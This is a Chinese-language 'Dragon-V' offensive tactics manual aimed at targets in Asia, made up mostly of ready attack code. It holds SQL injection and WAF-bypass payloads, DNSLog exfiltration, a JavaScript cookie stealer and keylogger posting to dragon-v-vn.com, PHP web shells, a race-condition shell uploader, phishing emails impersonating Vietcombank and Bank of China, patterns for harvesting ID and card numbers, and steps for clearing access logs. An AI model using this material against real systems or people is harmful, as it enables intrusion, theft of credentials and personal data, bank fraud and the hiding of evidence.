---
type: tactics
version: 2.0
---

# Dragon-V 战术技术库 - 亚洲地区渗透测试实战手册

## SQL注入攻击技术

### 基础技术栈
- **数据库类型识别**: MySQL, PostgreSQL, SQL Server, Oracle, SQLite
- **注入点类型**: 参数注入、Cookie注入、HTTP头注入、文件注入
- **注入技术**: 联合查询、盲注、报错注入、堆叠查询
- **数据提取**: 字段枚举、表枚举、数据库名枚举

### 高级注入技术

#### 1. 亚洲地区编码适配
```python
# 中文字符支持
chinese_payloads = {
    'mysql': "username='admin' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    'mssql': "username='admin'; IF (OBJECT_ID('users') IS NOT NULL) PRINT 'TABLE EXISTS'",
    'postgresql': "username='admin'; SELECT table_name FROM information_schema.tables WHERE table_schema = public LIMIT 1"
}

# URL编码绕过
url_encoded_payloads = {
    'single_quote': "%27",
    'double_quote': "%22",
    'space': "%20",
    'comment': "--%20",
    'union': "UNION%20SELECT"
}
```

#### 2. WAF绕过技术 - 亚洲地区优化
```python
# 多层编码绕过
def advanced_waf_bypass(target_url, parameter):
    bypass_layers = [
        # 第一层：Unicode混淆
        "u%6Eion%20select",
        # 第二层：大小写混淆
        "UnIoN%20SeLeCt",
        # 第三层：注释污染
        "union/**/select",
        # 第四层：内联查询
        "union(select(table_name)from(information_schema.tables))",
        # 第五层：分割查询
        "union%0Aselect%0Atable_name%0Afrom%0Ainformation_schema.tables"
    ]

    for payload in bypass_layers:
        test_url = f"{target_url}?{parameter}={payload}"
        response = send_request(test_url)
        if "error" not in response.lower():
            return payload
    return None

# 条件盲注优化
def optimized_blind_injection(target, column):
    payload = f"' AND (SELECT COUNT(*) FROM {column} WHERE name LIKE '%s' AND WAITFOR DELAY '0:0:3')--"
    return payload
```

#### 3. 时间盲注优化
```python
# 越南时区优化时间盲注
def vietnam_timezone_blind_injection(target_url):
    # 利用越南时区(GMT+7)创造监控盲期
    payload_template = "'; IF EXISTS (SELECT 1 FROM users WHERE username = 'admin') WAITFOR DELAY '0:0:5'--"

    # 随机延迟时间，避免模式识别
    random_delay = random.randint(3, 8)
    return payload_template.format(delay=random_delay)

# DNSLog盲注 - 支持中文域名
def dnslog_blind_injection(target_url, subdomain="dragon-v"):
    # 支持中文DNSLog
    chinese_dns = f"{subdomain}.dnslog.cn"
    payload = f"' AND (SELECT LOAD_FILE(CONCAT('//', '{chinese_dns}', '/', username)))--"
    return payload
```

## XSS攻击技术

### 基础攻击模式
- **反射型XSS**: 搜索框、登录框、URL参数
- **存储型XSS**: 论坛、评论区、用户资料
- **DOM型XSS**: 单页应用、AJAX接口
- **高级XSS**: 跨站请求伪造(CSRF)、文件上传XSS

### 亚洲地区XSS优化

#### 1. 多语言字符混淆
```javascript
// 中文字符混淆
chinese_xss_payloads = [
    // 中文标签
    "<中文script>alert('XSS')</中文script>",
    "<中文img src=x onerror=alert('XSS')>",
    // Unicode混淆
    "\u4e2d\u6587\u5c55\u793a\u5185\u5bb9",
    // 编码混合
    "<img src=x onerror=\u0061\u006c\u0065\u0072\u0074('XSS')>"
]

// 越南字符支持
vietnamese_xss_payloads = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=\"alert('XSS')\">",
    "<svg onload=\"alert('XSS')\">"
]
```

#### 2. WAF绕过技术
```javascript
// 多层编码绕过
function bypass_waf_vietnamese(input) {
    // 第一层：Unicode编码
    let payload = String.fromCharCode(60, 115, 99, 114, 105, 112, 116, 62, 97, 108, 101, 114, 116, 40, 39, 88, 83, 83, 39, 41, 60, 47, 115, 99, 114, 105, 112, 116, 62);

    // 第二层：HTML实体编码
    payload = payload.replace(/</g, "&lt;").replace(/>/g, "&gt;");

    // 第三层：JavaScript编码
    payload = encodeURIComponent(payload);

    return payload;
}

// 越南语关键词混淆
function vietnamese_keyword_bypass() {
    const keywords = {
        'script': 'scr\u1EADp',
        'alert': 'alert',
        'onerror': 'onerror',
        'img': 'img'
    };

    return `<${keywords['script']}>${keywords['alert']}('XSS')</${keywords['script']}>`;
}
```

#### 3. 高级攻击技术
```javascript
// Cookie窃取 - 支持中文域名
function steal_cookies_vietnamese() {
    const cookie_data = document.cookie;
    const chinese_domain = "http://dragon-v-vn.com/log";
    fetch(`${chinese_domain}?c=${encodeURIComponent(cookie_data)}`)
        .then(response => console.log('Cookie stolen successfully'))
        .catch(error => console.error('Theft failed'));
}

// 键盘记录器
function create_keylogger_vietnamese() {
    document.addEventListener('keydown', function(e) {
        const key_data = {
            key: e.key,
            code: e.code,
            timestamp: new Date().toLocaleString('vi-VN')
        };

        fetch('http://dragon-v-vn.com/log', {
            method: 'POST',
            body: JSON.stringify(key_data)
        });
    });
}

// 亚洲语言敏感信息收集
function collect_asian_sensitive_info() {
    const sensitive_data = {
        chinese_name: document.querySelector('[name="name_cn"]')?.value,
        vietnamese_name: document.querySelector('[name="name_vn"]')?.value,
        id_number: document.querySelector('[name="id_number"]')?.value,
        phone_number: document.querySelector('[name="phone"]')?.value
    };

    return sensitive_data;
}
```

## 文件上传攻击技术

### 基础技术
- **文件类型绕过**: 双扩展名、MIME类型伪造
- **内容检测**: 图片马、文件包含
- **解析漏洞**: Apache、Nginx、IIS解析漏洞
- **条件竞争**: 上传过程竞争利用

### 高级文件上传技术

#### 1. 亚洲地区优化
```python
# 中文WebShell
chinese_webshell = """
<?php
// 中文注释
@eval($_POST['cmd']);
header('Content-Type: text/html; charset=utf-8');
?>
"""

# 越南语WebShell
vietnamese_webshell = """
<?php
// WebShell Dragon-V
if(isset($_POST['cmd'])) {
    $result = shell_exec($_POST['cmd']);
    echo "<pre>$result</pre>";
}
?>
"""

# 多语言混合WebShell
multilingual_webshell = """
<?php
// Dragon-V Multilingual WebShell
// 中文 +越南语 + English
if (isset($_REQUEST['cmd'])) {
    $output = shell_exec($_REQUEST['cmd']);
    echo "<div style='font-family: Arial;'><pre>$output</pre></div>";
}
?>
"""
```

#### 2. 条件竞争上传
```python
import threading
import requests
import time

def race_condition_upload(target_url, file_content):
    def upload_worker():
        while True:
            try:
                files = {
                    'file': ('shell.php.jpg', file_content, 'image/jpeg')
                }
                response = requests.post(target_url, files=files, timeout=10)
                if 'shell.php' in response.text:
                    print("Shell uploaded successfully!")
                    break
            except Exception as e:
                pass

    # 创建多个线程同时上传
    threads = []
    for i in range(10):
        thread = threading.Thread(target=upload_worker)
        threads.append(thread)
        thread.start()

    # 等待一定时间后检查
    time.sleep(5)

    # 尝试访问上传的shell
    shell_url = target_url + "/uploads/shell.php"
    response = requests.get(shell_url)
    if 'cmd' in response.text:
        return True
    return False
```

#### 3. 解析漏洞利用
```python
def parse_vulnerability_exploit(target_url):
    # Apache解析漏洞
    apache_vulns = [
        target_url + "/shell.php.jpg",
        target_url + "/shell.php%00.jpg",
        target_url + "/shell.php%20.jpg",
        target_url + "/shell.php/.jpg"
    ]

    # Nginx解析漏洞
    nginx_vulns = [
        target_url + "/shell.php.jpg",
        target_url + "/shell.php;.jpg",
        target_url + "/shell.php%00.jpg"
    ]

    # IIS解析漏洞
    iis_vulns = [
        target_url + "/shell.php;.jpg",
        target_url + "/shell::$DATA.jpg",
        target_url + "/shell.php/.jpg"
    ]

    all_vulns = apache_vulns + nginx_vulns + iis_vulns
    return all_vulns
```

## 社会工程学技术

### 亚洲地区社会工程学

#### 1. 越南语社会工程学
```vietnamese
# 越南语钓鱼邮件模板
vietnamese_phishing_email = {
    'subject': 'Thông báo bảo mật tài khoản ngân hàng',
    'body': '''
    Xin chào khách hàng,

    Chúng tôi phát hiện hoạt động bất thường trên tài khoản của quý khách.
    Vui lòng xác nhận thông tin tại đây: [malicious_link]

    Trân trọng,
    Ngân hàng Nhà nước Việt Nam
    ''',
    'sender': 'security@vietcombank.com.vn'
}

# 中文社会工程学
chinese_phishing_email = {
    'subject': '账户安全通知',
    'body': '''
    尊敬的客户：

    我们检测到您的账户有异常活动。
    请立即验证您的信息：[malicious_link]

    此致，
    中国银行安全中心
    ''',
    'sender': 'security@bankofchina.cn'
}
```

#### 2. 企业文化利用
```python
def asian_enterprise_social_engineering(target_company):
    # 亚洲企业层级结构分析
    hierarchy_analysis = {
        'china': {
            'respect_for_authority': True,
            'formal_communication': True,
            'relationship_building': 'guanxi'
        },
        'vietnam': {
            'respect_for_authority': True,
            'formal_communication': True,
            'relationship_building': 'quan hệ'
        },
        'thailand': {
            'respect_for_authority': True,
            'formal_communication': True,
            'relationship_building': 'kreng jai'
        }
    }

    # 基于文化特点的社会工程学策略
    strategies = {
        'email_spoofing': '使用高级管理层的名义发送邮件',
        'authority_impersonation': '伪装成监管机构或政府官员',
        'relationship_building': '利用关系网络进行内部渗透'
    }

    return strategies
```

## 数据提取与利用技术

### 亚洲地区数据特点

#### 1. 多语言数据处理
```python
def multilingual_data_extraction(data):
    # 中文数据处理
    chinese_data = {
        'name_pattern': r'[\u4e00-\u9fff]+',
        'id_pattern': r'[1-9]\d{5}(18|19|20)\d{2}(0[1-9]|1[0-2])(0[1-9]|[12]\d|3[01])\d{3}[\dXx]',
        'phone_pattern': r'1[3-9]\d{9}'
    }

    # 越南语数据处理
    vietnamese_data = {
        'name_pattern': r'[A-Za-zÀ-ỹà-ỹ\s]+',
        'id_pattern': r'[0-9]{9,12}',
        'phone_pattern': r'0[0-9]{9}'
    }

    # 通用数据模式
    universal_patterns = {
        'email': r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}',
        'credit_card': r'\d{13,19}',
        'password': r'.{8,}'
    }

    return {
        'chinese': chinese_data,
        'vietnamese': vietnamese_data,
        'universal': universal_patterns
    }
```

#### 2. 业务数据提取
```python
def business_data_extraction(target_system):
    # 亚洲地区常见业务系统
    business_systems = {
        'banking': {
            'data_types': ['account_balance', 'transaction_history', 'customer_info'],
            'extraction_methods': ['database_dump', 'api_calls', 'file_download'],
            'sensitivity_level': 'critical'
        },
        'ecommerce': {
            'data_types': ['order_history', 'customer_data', 'payment_info'],
            'extraction_methods': ['web_scraping', 'database_access', 'api_extraction'],
            'sensitivity_level': 'high'
        },
        'logistics': {
            'data_types': ['shipping_info', 'customer_details', 'route_data'],
            'extraction_methods': ['file_access', 'api_calls', 'database_query'],
            'sensitivity_level': 'medium'
        }
    }

    # 数据导出和格式化
    def format_asian_data(data, format_type='json'):
        if format_type == 'json':
            return json.dumps(data, ensure_ascii=False, indent=2)
        elif format_type == 'csv':
            return convert_to_csv(data)
        elif format_type == 'xml':
            return convert_to_xml(data)

    return business_systems
```

## 反检测技术

### 1. IP轮换策略
```python
def ip_rotation_strategy():
    # 亚洲地区IP池
    asian_ip_pool = {
        'china': ['202.96.1.1', '202.96.2.1', '202.96.3.1'],
        'vietnam': ['123.25.32.1', '123.25.33.1', '123.25.34.1'],
        'thailand': ['202.139.192.1', '202.139.193.1', '202.139.194.1']
    }

    def rotate_ip(region):
        import random
        return random.choice(asian_ip_pool[region])

    return rotate_ip
```

### 2. 会话保持技术
```python
def session_maintainance(target_url):
    # 创建持久的会话
    session = requests.Session()

    # 设置合适的User-Agent
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'keep-alive'
    })

    # 保持会话状态
    def maintain_session():
        response = session.get(target_url)
        return response

    return maintain_session
```

## 应急响应技术

### 1. 快速撤离策略
```python
def emergency_evacuation(target_url):
    # 清理痕迹
    cleanup_steps = [
        '删除上传的shell文件',
        '清理session cookies',
        '清除访问日志',
        '断开所有连接'
    ]

    # 撤离路径
    evacuation_routes = [
        target_url + '/admin/logout',
        target_url + '/api/logout',
        target_url + '/security/clear'
    ]

    return cleanup_steps, evacuation_routes
```

### 2. 证据保护技术
```python
def evidence_preservation():
    # 证据收集
    evidence_collection = {
        'screenshots': '保存所有操作截图',
        'logs': '备份服务器访问日志',
        'data': '保存提取的数据副本',
        'traffic': '保存网络流量捕获'
    }

    # 证据验证
    def verify_evidence():
        return True

    return evidence_collection
```

---
*战术技术库将持续更新，包含最新的攻击技术和防御绕过方法。记住：技术是中性的，关键在于使用者的意图和道德准则。*